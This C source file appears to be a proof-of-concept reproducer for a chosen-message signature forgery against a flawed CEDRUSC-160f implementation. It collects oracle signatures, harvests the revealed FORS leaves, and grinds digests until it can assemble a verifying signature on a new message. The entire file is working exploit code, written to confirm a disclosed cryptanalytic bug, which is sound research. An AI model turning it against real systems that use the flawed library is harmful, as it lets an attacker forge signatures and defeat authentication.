/*
 * End-to-end chosen-message forgery for CEDRUSC-160f (sign-03).
 *
 * The submitted hash_message() forces the hypertree index to zero and, due to
 * an unparenthesized macro, retains only two bottom-leaf bits.  Only four FORS
 * keys are therefore used.  Repeated signatures reveal enough leaves from
 * each of the 30 height-7 FORS trees to synthesize a signature on a new
 * message.  The hypertree suffix authenticates the fixed FORS public key and
 * can be copied from any oracle signature at the selected address.
 *
 * This reproducer uses only the submitted signature API for key generation,
 * signing and final verification.  Its digest grinder uses the submission's
 * own auxfunc.c SM3 implementation, linked into this executable.
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <errno.h>
#include <inttypes.h>
#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "link_common.h"
#include "link_sig.h"
#include "auxfunc.h"

enum {
    C_N = 20,
    C_PK_BYTES = 40,
    C_SK_BYTES = 80,
    C_SIG_BYTES = 19812,
    C_ZERO_BITS = 9,
    C_ZERO_BYTES = 2,
    C_FORS_HEIGHT = 7,
    C_FORS_TREES = 30,
    C_FORS_LEAVES = 1 << C_FORS_HEIGHT,
    C_FORS_MSG_BYTES = 27,
    C_TREE_BYTES = 8,
    C_LEAF_BYTES = 1,
    C_DGST_BYTES = C_ZERO_BYTES + C_FORS_MSG_BYTES + C_TREE_BYTES + C_LEAF_BYTES,
    C_COUNTER_BYTES = 4,
    C_PREFIX_BYTES = C_N + C_COUNTER_BYTES,
    C_FORS_CHUNK = (C_FORS_HEIGHT + 1) * C_N,
    C_FORS_BYTES = C_FORS_TREES * C_FORS_CHUNK,
    C_HT_OFFSET = C_PREFIX_BYTES + C_FORS_BYTES,
    C_HT_BYTES = C_SIG_BYTES - C_HT_OFFSET,
    C_ADDRESSES = 4,
    C_SEED_BYTES = 64,
    C_DEFAULT_QUERIES = 1000
};

typedef struct {
    unsigned char present;
    unsigned char chunk[C_FORS_CHUNK];
} disclosure_t;

static disclosure_t g_disclosures[C_ADDRESSES][C_FORS_TREES][C_FORS_LEAVES];
static unsigned int g_coverage[C_ADDRESSES][C_FORS_TREES];
static unsigned char g_ht[C_ADDRESSES][C_HT_BYTES];
static unsigned char g_have_ht[C_ADDRESSES];

static void die(const char *what)
{
    fprintf(stderr, "reproduce_forgery: %s\n", what);
    exit(2);
}

static void *need_sym(void *lib, const char *name)
{
    dlerror();
    void *p = dlsym(lib, name);
    const char *e = dlerror();
    if (e) {
        fprintf(stderr, "reproduce_forgery: missing symbol %s: %s\n", name, e);
        exit(2);
    }
    return p;
}

static unsigned long long parse_count(const char *s, const char *name)
{
    char *end = NULL;
    errno = 0;
    unsigned long long v = strtoull(s, &end, 0);
    if (errno || !end || *end || v == 0) {
        fprintf(stderr, "reproduce_forgery: invalid %s: %s\n", name, s);
        exit(2);
    }
    return v;
}

static void put_u32be(unsigned char out[4], uint32_t x)
{
    out[0] = (unsigned char)(x >> 24);
    out[1] = (unsigned char)(x >> 16);
    out[2] = (unsigned char)(x >> 8);
    out[3] = (unsigned char)x;
}

static void put_u64be(unsigned char out[8], uint64_t x)
{
    for (int i = 7; i >= 0; i--) {
        out[i] = (unsigned char)x;
        x >>= 8;
    }
}

/* CEDRUS+C's pseudoXOF for its 38-byte H_MSG output: SM3(input || I2OSP(i,4))
 * for counters i=1,2.  The candidate helper allocates twice per call; this
 * allocation-free equivalent makes the digest search practical. */
static int xof38(unsigned char out[C_DGST_BYTES], unsigned char *in,
                 size_t in_len)
{
    unsigned char digest[32];
    for (uint32_t ctr = 1; ctr <= 2; ctr++) {
        put_u32be(in + in_len, ctr);
        if (sm3hash(256, in, (unsigned long long)(in_len + 4) * 8, digest) != 0)
            return -1;
        size_t off = (size_t)(ctr - 1) * 32;
        size_t take = C_DGST_BYTES - off;
        if (take > 32) take = 32;
        memcpy(out + off, digest, take);
    }
    return 0;
}

static int digest_ok(const unsigned char digest[C_DGST_BYTES])
{
    /* hash_message reads the first two bytes as a big-endian integer and
     * requires its low nine bits to be zero. */
    return digest[1] == 0 && (digest[0] & 1) == 0;
}

static unsigned int digest_address(const unsigned char digest[C_DGST_BYTES])
{
    /* The source expression expands as 32 - SPX_TREE_HEIGHT + 1, yielding a
     * two-bit mask rather than the nominal four-bit bottom height. */
    return digest[C_ZERO_BYTES + C_FORS_MSG_BYTES + C_TREE_BYTES] & 3u;
}

static void digest_indices(unsigned int out[C_FORS_TREES],
                           const unsigned char digest[C_DGST_BYTES])
{
    const unsigned char *m = digest + C_ZERO_BYTES;
    unsigned int bit = 0;
    for (unsigned int i = 0; i < C_FORS_TREES; i++) {
        unsigned int x = 0;
        for (unsigned int j = 0; j < C_FORS_HEIGHT; j++, bit++)
            x |= ((m[bit >> 3] >> (bit & 7)) & 1u) << j;
        out[i] = x;
    }
}

static int make_digest(unsigned char digest[C_DGST_BYTES],
                       unsigned char *hash_in, size_t hash_len,
                       const unsigned char R[C_N], uint32_t counter)
{
    memcpy(hash_in, R, C_N);
    put_u32be(hash_in + hash_len - C_COUNTER_BYTES, counter);
    return xof38(digest, hash_in, hash_len);
}

static void record_signature(const unsigned char *sig,
                             const unsigned char digest[C_DGST_BYTES])
{
    unsigned int indices[C_FORS_TREES];
    unsigned int addr = digest_address(digest);
    digest_indices(indices, digest);

    for (unsigned int i = 0; i < C_FORS_TREES; i++) {
        disclosure_t *d = &g_disclosures[addr][i][indices[i]];
        const unsigned char *chunk = sig + C_PREFIX_BYTES + i * C_FORS_CHUNK;
        if (!d->present) {
            d->present = 1;
            memcpy(d->chunk, chunk, C_FORS_CHUNK);
            g_coverage[addr][i]++;
        } else if (memcmp(d->chunk, chunk, C_FORS_CHUNK) != 0) {
            die("same FORS leaf produced inconsistent signature material");
        }
    }

    if (!g_have_ht[addr]) {
        memcpy(g_ht[addr], sig + C_HT_OFFSET, C_HT_BYTES);
        g_have_ht[addr] = 1;
    } else if (memcmp(g_ht[addr], sig + C_HT_OFFSET, C_HT_BYTES) != 0) {
        die("hypertree suffix was not reusable at a repeated address");
    }
}

static long double expected_trials(void)
{
    long double covered = 0;
    for (unsigned int a = 0; a < C_ADDRESSES; a++) {
        long double p = 1;
        for (unsigned int i = 0; i < C_FORS_TREES; i++)
            p *= (long double)g_coverage[a][i] / C_FORS_LEAVES;
        covered += p / C_ADDRESSES;
    }
    return covered == 0 ? INFINITY : ldexpl(1.0L, C_ZERO_BITS) / covered;
}

static int all_disclosed(unsigned int addr,
                         const unsigned int indices[C_FORS_TREES])
{
    for (unsigned int i = 0; i < C_FORS_TREES; i++)
        if (!g_disclosures[addr][i][indices[i]].present) return 0;
    return g_have_ht[addr] != 0;
}

static void usage(const char *prog)
{
    fprintf(stderr, "usage: %s <libCEDRUSC-160f.so> [signing-queries] [max-hash-trials]\n",
            prog);
    exit(2);
}

int main(int argc, char **argv)
{
    if (argc < 2 || argc > 4) usage(argv[0]);
    unsigned long long queries = argc >= 3 ? parse_count(argv[2], "signing query count")
                                          : C_DEFAULT_QUERIES;
    unsigned long long max_trials = argc >= 4 ? parse_count(argv[3], "hash trial count")
                                              : (UINT64_C(1) << 28);

    void *lib = dlopen(argv[1], RTLD_NOW | RTLD_LOCAL);
    if (!lib) {
        fprintf(stderr, "reproduce_forgery: dlopen: %s\n", dlerror());
        return 2;
    }
    const ngcc_meta_t *(*meta_fn)(void) = need_sym(lib, "ngcc_meta");
    int (*seed_fn)(const unsigned char *, unsigned long long) = need_sym(lib, "ngcc_seed");
    ngcc_sig_keygen_fn keygen = need_sym(lib, "sig_keygen");
    ngcc_sig_sign_fn sign = need_sym(lib, "sig_sign");
    ngcc_sig_verify_fn verify = need_sym(lib, "sig_verify");
    const ngcc_meta_sig_t *meta = (const ngcc_meta_sig_t *)meta_fn();
    if (!meta || meta->h.type != NGCC_TYPE_SIG ||
        strcmp(meta->h.instance, "CEDRUSC-160f") != 0 ||
        meta->pk_len != C_PK_BYTES || meta->sk_len != C_SK_BYTES ||
        meta->sn_len != C_SIG_BYTES)
        die("the exploit requires the CEDRUSC-160f library");

    unsigned char seed[C_SEED_BYTES];
    for (unsigned int i = 0; i < sizeof seed; i++) seed[i] = (unsigned char)(0x31 + 17 * i);
    if (seed_fn(seed, sizeof seed) != 0) die("ngcc_seed failed");

    unsigned char *pk = calloc(C_PK_BYTES, 1), *sk = calloc(C_SK_BYTES, 1);
    unsigned char *sig = malloc(C_SIG_BYTES), *forged = calloc(C_SIG_BYTES, 1);
    if (!pk || !sk || !sig || !forged) die("allocation failed");
    unsigned long long pk_len = C_PK_BYTES, sk_len = C_SK_BYTES;
    if (keygen(pk, &pk_len, sk, &sk_len) != 0) die("key generation failed");

    unsigned char query_msg[96], digest[C_DGST_BYTES], R[C_N];
    unsigned char hash_in[256 + 4];
    for (unsigned long long q = 0; q < queries; q++) {
        int n = snprintf((char *)query_msg, sizeof query_msg,
                         "CEDRUSC-160f chosen-message query %llu", q);
        if (n < 0 || (size_t)n >= sizeof query_msg) die("query message overflow");
        unsigned long long sig_len = C_SIG_BYTES;
        if (sign(sk, sk_len, query_msg, (unsigned long long)n, sig, &sig_len) != 0 ||
            sig_len != C_SIG_BYTES)
            die("signing oracle failed");

        size_t hash_len = C_N + C_PK_BYTES + (size_t)n + C_COUNTER_BYTES;
        memcpy(hash_in + C_N, pk, C_PK_BYTES);
        memcpy(hash_in + C_N + C_PK_BYTES, query_msg, (size_t)n);
        memcpy(R, sig, C_N);
        uint32_t counter = ((uint32_t)sig[C_N] << 24) |
                           ((uint32_t)sig[C_N + 1] << 16) |
                           ((uint32_t)sig[C_N + 2] << 8) |
                           sig[C_N + 3];
        if (counter == 0 || make_digest(digest, hash_in, hash_len, R, counter) != 0 ||
            !digest_ok(digest))
            die("could not reproduce an oracle signature digest");
        record_signature(sig, digest);
    }

    static const unsigned char forged_msg[] =
        "CEDRUSC-160f forged without submitting this message to the signer";
    const size_t forged_len = sizeof forged_msg - 1;
    const size_t hash_len = C_N + C_PK_BYTES + forged_len + C_COUNTER_BYTES;
    memset(hash_in, 0, sizeof hash_in);
    memcpy(hash_in + C_N, pk, C_PK_BYTES);
    memcpy(hash_in + C_N + C_PK_BYTES, forged_msg, forged_len);
    put_u32be(hash_in + hash_len - C_COUNTER_BYTES, 1);
    memcpy(hash_in, "NGCC-FORS-FORGE", 15);

    unsigned int found_addr = 0, found_indices[C_FORS_TREES];
    unsigned long long trial;
    for (trial = 1; trial <= max_trials; trial++) {
        put_u64be(hash_in + C_N - 8, trial);
        if (xof38(digest, hash_in, hash_len) != 0) die("H_MSG computation failed");
        if (!digest_ok(digest)) continue;
        unsigned int addr = digest_address(digest);
        unsigned int indices[C_FORS_TREES];
        digest_indices(indices, digest);
        if (!all_disclosed(addr, indices)) continue;
        found_addr = addr;
        memcpy(found_indices, indices, sizeof found_indices);
        break;
    }

    if (trial > max_trials) {
        printf("ATTACK %-22s %-24s NOT-CONFIRMED no covered digest in %llu trials "
               "after %llu signing queries (expected %.0Lf trials)\n",
               "sign-fors-forgery", meta->h.instance, max_trials, queries,
               expected_trials());
        free(pk); free(sk); free(sig); free(forged);
        dlclose(lib);
        return 1;
    }

    memcpy(forged, hash_in, C_N);
    put_u32be(forged + C_N, 1);
    for (unsigned int i = 0; i < C_FORS_TREES; i++)
        memcpy(forged + C_PREFIX_BYTES + i * C_FORS_CHUNK,
               g_disclosures[found_addr][i][found_indices[i]].chunk,
               C_FORS_CHUNK);
    memcpy(forged + C_HT_OFFSET, g_ht[found_addr], C_HT_BYTES);

    int accepted = verify(pk, C_PK_BYTES, forged, C_SIG_BYTES,
                          (unsigned char *)forged_msg, forged_len) == 0;
    printf("ATTACK %-22s %-24s %s forged a fresh-message signature after "
           "%llu signing queries and %llu H_MSG trials (address %u; expected %.0Lf)\n",
           "sign-fors-forgery", meta->h.instance,
           accepted ? "CONFIRMED" : "NOT-CONFIRMED", queries, trial,
           found_addr, expected_trials());

    free(pk); free(sk); free(sig); free(forged);
    dlclose(lib);
    return accepted ? 0 : 1;
}
